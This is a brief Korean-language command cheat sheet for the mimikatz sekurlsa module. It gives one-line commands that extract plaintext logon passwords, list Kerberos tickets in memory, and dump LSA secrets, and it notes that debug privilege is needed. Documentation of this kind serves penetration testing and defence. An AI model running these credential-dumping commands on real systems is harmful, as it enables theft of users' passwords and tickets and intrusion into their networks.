# mimikatz sekurlsa

> 메모리에서 자격 증명과 비밀 정보를 추출.
> 디버그 권한이 필요.
> 더 많은 정보: <https://github.com/gentilkiwi/mimikatz>.

- 평문 비밀번호 추출:

`mimikatz "sekurlsa::logonpasswords"`

- 메모리에 저장된 Kerberos 티켓 목록 표시:

`mimikatz "sekurlsa::tickets"`

- LSA 비밀 정보 덤프:

`mimikatz "sekurlsa::secrets"`
